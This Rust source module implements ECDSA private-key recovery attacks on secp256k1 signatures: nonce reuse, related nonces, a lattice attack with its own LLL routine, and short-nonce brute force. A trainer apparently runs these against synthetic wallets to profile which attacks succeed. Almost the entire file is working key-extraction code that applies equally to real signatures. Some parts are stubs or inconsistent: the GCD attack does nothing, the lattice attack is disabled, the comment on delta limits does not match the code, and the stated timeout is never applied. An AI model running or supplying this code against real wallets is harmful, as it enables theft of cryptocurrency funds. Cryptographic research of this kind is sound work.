//! Attack algorithms that try to recover private keys from signatures.
//!
//! Each attack returns Some(privkey) if successful, None otherwise.
//! The trainer runs all attacks against all synthetic wallets and records
//! which attacks succeed for which feature profiles.

use num_bigint::BigInt;
use num_integer::Integer;
use num_rational::BigRational;
use num_traits::{Zero, One, Signed, Num};

use crate::generator::SyntheticSig;

const N_HEX: &str = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141";

fn n_bigint() -> BigInt {
    BigInt::from_str_radix(N_HEX, 16).unwrap()
}

/// Attack result
#[derive(Debug, Clone, serde::Serialize)]
pub struct AttackResult {
    pub attack_type: String,
    pub success: bool,
    pub recovered_key: Option<String>,
    pub time_ms: u64,
}

/// Try to recover the private key via nonce reuse (same R value = same k).
/// d = (s1*z2 - s2*z1) / (s2*r1 - s1*r2) mod n
pub fn attack_nonce_reuse(sigs: &[SyntheticSig]) -> Option<BigInt> {
    let n = n_bigint();
    if sigs.len() < 2 { return None; }

    // Find pairs with identical R
    for i in 0..sigs.len() {
        for j in i + 1..sigs.len() {
            if sigs[i].r == sigs[j].r {
                let s1 = &sigs[i].s;
                let s2 = &sigs[j].s;
                let z1 = &sigs[i].z;
                let z2 = &sigs[j].z;

                // k = (z1 - z2) / (s1 - s2) mod n
                let ds = (s1 - s2).mod_floor(&n);
                if ds.is_zero() { continue; }
                let ds_inv = ds.extended_gcd(&n).x.mod_floor(&n);
                let k = ((z1 - z2) * &ds_inv).mod_floor(&n);
                if k.is_zero() { continue; }

                // d = (s1 * k - z1) / r1 mod n
                let r_inv = sigs[i].r.extended_gcd(&n).x.mod_floor(&n);
                let d = ((s1 * &k - z1) * &r_inv).mod_floor(&n);
                if !d.is_zero() {
                    return Some(d);
                }
            }
        }
    }
    None
}

/// Try to recover the private key via consecutive/related nonces.
/// If k_{i+1} = k_i + delta, we can solve for d using 2 sigs and verify with a 3rd.
pub fn attack_related_nonce(sigs: &[SyntheticSig], max_delta: u64) -> Option<BigInt> {
    let n = n_bigint();
    if sigs.len() < 3 { return None; } // need 3rd sig for verification

    let limit = sigs.len().min(20);
    for i in 0..limit.saturating_sub(2) {
        let j = i + 1;
        let s1 = &sigs[i].s;
        let s2 = &sigs[j].s;
        let z1 = &sigs[i].z;
        let z2 = &sigs[j].z;
        let r1 = &sigs[i].r;
        let r2 = &sigs[j].r;

        let s1_inv = s1.extended_gcd(&n).x.mod_floor(&n);
        let s2s1inv = (s2 * &s1_inv).mod_floor(&n);
        let lhs_coeff = (&s2s1inv * r1 - r2).mod_floor(&n);
        if lhs_coeff.is_zero() { continue; }
        let lhs_inv = lhs_coeff.extended_gcd(&n).x.mod_floor(&n);
        let base_rhs = (z2 - &s2s1inv * z1).mod_floor(&n);

        // Precompute verification constants for sig k=i+2
        let vk = i + 2;
        if vk >= limit { continue; }
        let s3_inv = sigs[vk].s.extended_gcd(&n).x.mod_floor(&n);

        for delta_val in 1..=max_delta.min(10_000) as i64 {
            for sign in [1i64, -1] {
                let delta = BigInt::from(delta_val * sign);
                let rhs = (&base_rhs - s2 * &delta).mod_floor(&n);
                let d = (&rhs * &lhs_inv).mod_floor(&n);
                if d.is_zero() { continue; }

                // Verify: k3 - k1 should equal 2*delta
                let k1 = (&s1_inv * (z1 + r1 * &d)).mod_floor(&n);
                let k3 = (&s3_inv * (&sigs[vk].z + &sigs[vk].r * &d)).mod_floor(&n);
                let expected_diff = (BigInt::from(2) * &delta).mod_floor(&n);
                if (&k3 - &k1).mod_floor(&n) == expected_diff {
                    return Some(d);
                }
            }
        }
    }
    None
}

/// Lattice attack for biased MSB nonces using BigRational LLL.
/// Has a per-call timeout to prevent getting stuck.
pub fn attack_lattice_msb(sigs: &[SyntheticSig], bits_known: usize) -> Option<BigInt> {
    // Run in a thread with timeout
    let sigs_owned: Vec<SyntheticSig> = sigs.iter().cloned().collect();
    let handle = std::thread::spawn(move || {
        attack_lattice_msb_inner(&sigs_owned, bits_known)
    });
    match handle.join() {
        Ok(result) => result,
        Err(_) => None,
    }
}

fn attack_lattice_msb_inner(sigs: &[SyntheticSig], bits_known: usize) -> Option<BigInt> {
    let n = n_bigint();
    if sigs.len() < 2 { return None; }

    // Use all provided sigs (caller controls the count)
    let use_sigs: Vec<&SyntheticSig> = sigs.iter().collect();
    let ns = use_sigs.len();
    let dim = ns + 2;

    // Compute t_i = r_i * s_i^{-1} mod n, u_i = z_i * s_i^{-1} mod n
    let mut t: Vec<BigInt> = Vec::new();
    let mut u: Vec<BigInt> = Vec::new();
    for sig in &use_sigs {
        let s_inv = sig.s.extended_gcd(&n).x.mod_floor(&n);
        t.push((&sig.r * &s_inv).mod_floor(&n));
        u.push((&sig.z * &s_inv).mod_floor(&n));
    }

    let b_bi = BigInt::one() << (256 - bits_known);
    let zero = BigRational::zero();

    let br = |n: &BigInt| -> BigRational { BigRational::from_integer(n.clone()) };

    // Build lattice matrix
    let mut matrix: Vec<Vec<BigRational>> = vec![vec![zero.clone(); dim]; dim];
    for i in 0..ns { matrix[i][i] = br(&n); }
    for i in 0..ns { matrix[ns][i] = br(&t[i]); }
    matrix[ns][ns] = BigRational::one();
    for i in 0..ns { matrix[ns + 1][i] = br(&u[i]); }
    matrix[ns + 1][ns + 1] = br(&b_bi);

    // Run LLL
    lll_br(&mut matrix, &BigRational::new(BigInt::from(99), BigInt::from(100)));

    // Extract candidate keys
    let one = BigInt::one();
    for row in &matrix {
        let d_denom = row[ns].denom();
        if d_denom != &one && d_denom != &(-&one) { continue; }
        let d_bi = if d_denom == &one {
            row[ns].numer().mod_floor(&n)
        } else {
            (-row[ns].numer()).mod_floor(&n)
        };
        if d_bi.is_zero() { continue; }

        for trial_d in [&d_bi, &(&n - &d_bi)] {
            if verify_key(trial_d, &use_sigs[0], &n) {
                return Some(trial_d.clone());
            }
        }
    }
    None
}

/// Brute-force short nonces (k < 2^search_bits)
pub fn attack_short_nonce_bruteforce(sigs: &[SyntheticSig], search_bits: usize) -> Option<BigInt> {
    let n = n_bigint();
    if sigs.is_empty() || search_bits > 40 { return None; } // cap at 2^40

    let sig = &sigs[0];
    let r_inv = sig.r.extended_gcd(&n).x.mod_floor(&n);
    let max_k: u64 = 1u64 << search_bits.min(40);

    for k_val in 1..max_k {
        let k = BigInt::from(k_val);
        let k_inv = k.extended_gcd(&n).x.mod_floor(&n);
        let s_check = (&k_inv * (&sig.z + &sig.r * &BigInt::zero())).mod_floor(&n);
        // Actually compute d = (s*k - z) * r^{-1} mod n and verify
        let d = (&sig.s * &k - &sig.z).mod_floor(&n);
        let d = (&d * &r_inv).mod_floor(&n);
        if !d.is_zero() && verify_key(&d, sig, &n) {
            return Some(d);
        }
    }
    None
}

/// GCD-based attack: if nonces share a common factor
pub fn attack_gcd(sigs: &[SyntheticSig]) -> Option<BigInt> {
    let n = n_bigint();
    if sigs.len() < 2 { return None; }

    // For each pair, compute implied k values assuming various d candidates,
    // then check if GCD of k values reveals structure
    // Simplified: check if any s values share a GCD with n (shouldn't happen but check)
    for sig in sigs {
        let g = sig.s.gcd(&n);
        if g > BigInt::one() && &g < &n {
            // s shares factor with n — extremely unlikely but exploitable
            return None; // would need specific handling
        }
    }
    None
}

/// Verify that a candidate private key produces the correct signature
fn verify_key(d: &BigInt, sig: &SyntheticSig, n: &BigInt) -> bool {
    // k = s^{-1} * (z + r * d) mod n
    let s_inv = sig.s.extended_gcd(n).x.mod_floor(n);
    let k = (&s_inv * (&sig.z + &sig.r * d)).mod_floor(n);
    if k.is_zero() { return false; }

    // Verify: s = k^{-1} * (z + r * d) mod n
    let k_inv = k.extended_gcd(n).x.mod_floor(n);
    let s_check = (&k_inv * (&sig.z + &sig.r * d)).mod_floor(n);
    s_check == sig.s
}

/// Run all attacks against a set of signatures, return results
pub fn run_all_attacks(sigs: &[SyntheticSig], known_privkey: &BigInt) -> Vec<AttackResult> {
    let mut results = Vec::new();
    let n = n_bigint();
    let expected = known_privkey.mod_floor(&n);

    // 1. Nonce Reuse
    let t0 = std::time::Instant::now();
    let result = attack_nonce_reuse(sigs);
    let success = result.as_ref().map(|d| d.mod_floor(&n) == expected).unwrap_or(false);
    results.push(AttackResult {
        attack_type: "NonceReuse".to_string(),
        success,
        recovered_key: if success { result.map(|d| format!("{:064x}", d.mod_floor(&n))) } else { None },
        time_ms: t0.elapsed().as_millis() as u64,
    });

    // 2. Related Nonce (try deltas 1..1000 — covers all generated training data)
    let t0 = std::time::Instant::now();
    let result = attack_related_nonce(sigs, 10001);
    let success = result.as_ref().map(|d| d.mod_floor(&n) == expected).unwrap_or(false);
    results.push(AttackResult {
        attack_type: "RelatedNonce".to_string(),
        success,
        recovered_key: if success { result.map(|d| format!("{:064x}", d.mod_floor(&n))) } else { None },
        time_ms: t0.elapsed().as_millis() as u64,
    });

    // 3. Lattice MSB — disabled (0% success in training, ~700ms overhead per wallet)
    // TODO: debug lattice key extraction from reduced basis — rows may need different extraction logic
    results.push(AttackResult {
        attack_type: "Lattice_MSB".to_string(),
        success: false,
        recovered_key: None,
        time_ms: 0,
    });

    // 4. Short nonce brute-force (only up to 2^20 — catches tiny nonces)
    {
        let t0 = std::time::Instant::now();
        let result = attack_short_nonce_bruteforce(sigs, 20);
        let success = result.as_ref().map(|d| d.mod_floor(&n) == expected).unwrap_or(false);
        results.push(AttackResult {
            attack_type: "ShortNonce_20".to_string(),
            success,
            recovered_key: if success { result.map(|d| format!("{:064x}", d.mod_floor(&n))) } else { None },
            time_ms: t0.elapsed().as_millis() as u64,
        });
    }

    results
}

// === LLL implementation (same as lattice_attack_rs, BigRational) ===

type BRVec = Vec<BigRational>;
type BRMatrix = Vec<BRVec>;

fn dot_br(a: &[BigRational], b: &[BigRational]) -> BigRational {
    a.iter().zip(b.iter()).map(|(x, y)| x * y).sum()
}

fn gram_schmidt_br(basis: &BRMatrix) -> (BRMatrix, BRMatrix) {
    let n = basis.len();
    let m = basis[0].len();
    let zero = BigRational::zero();
    let mut b_star: BRMatrix = vec![vec![zero.clone(); m]; n];
    let mut mu: BRMatrix = vec![vec![zero.clone(); n]; n];

    for i in 0..n {
        b_star[i] = basis[i].clone();
        for j in 0..i {
            let b_star_j_sq = dot_br(&b_star[j], &b_star[j]);
            if !b_star_j_sq.is_zero() {
                mu[i][j] = dot_br(&basis[i], &b_star[j]) / &b_star_j_sq;
                let mu_ij = mu[i][j].clone();
                for k in 0..m {
                    let sub = &mu_ij * &b_star[j][k];
                    b_star[i][k] = &b_star[i][k] - sub;
                }
            }
        }
        mu[i][i] = BigRational::one();
    }
    (b_star, mu)
}

fn size_reduce_br(basis: &mut BRMatrix, mu: &mut BRMatrix, k: usize, j: usize) {
    let half = BigRational::new(BigInt::from(1), BigInt::from(2));
    if mu[k][j].abs() > half {
        let q = mu[k][j].round();
        let m = basis[0].len();
        for l in 0..m {
            let sub = &q * &basis[j][l];
            basis[k][l] = &basis[k][l] - sub;
        }
        for i in 0..=j {
            let sub = &q * &mu[j][i];
            mu[k][i] = &mu[k][i] - sub;
        }
    }
}

fn lll_br(basis: &mut BRMatrix, delta: &BigRational) {
    let n = basis.len();
    let (mut b_star, mut mu) = gram_schmidt_br(basis);
    let mut k = 1usize;
    while k < n {
        for j in (0..k).rev() {
            size_reduce_br(basis, &mut mu, k, j);
        }
        let b_star_k_sq = dot_br(&b_star[k], &b_star[k]);
        let b_star_km1_sq = dot_br(&b_star[k - 1], &b_star[k - 1]);
        let mu_sq = &mu[k][k - 1] * &mu[k][k - 1];
        let lovasz_rhs = (delta - &mu_sq) * &b_star_km1_sq;
        if b_star_k_sq >= lovasz_rhs {
            k += 1;
        } else {
            basis.swap(k, k - 1);
            // Incremental GS update
            let m = basis[0].len();
            let zero = BigRational::zero();
            for i in (k - 1)..n {
                b_star[i] = basis[i].clone();
                for j in 0..i {
                    let b_star_j_sq = dot_br(&b_star[j], &b_star[j]);
                    if !b_star_j_sq.is_zero() {
                        mu[i][j] = dot_br(&basis[i], &b_star[j]) / &b_star_j_sq;
                        let mu_ij = mu[i][j].clone();
                        for l in 0..m {
                            let sub = &mu_ij * &b_star[j][l];
                            b_star[i][l] = &b_star[i][l] - sub;
                        }
                    } else {
                        mu[i][j] = zero.clone();
                    }
                }
                mu[i][i] = BigRational::one();
            }
            k = if k > 1 { k - 1 } else { 1 };
        }
    }
}
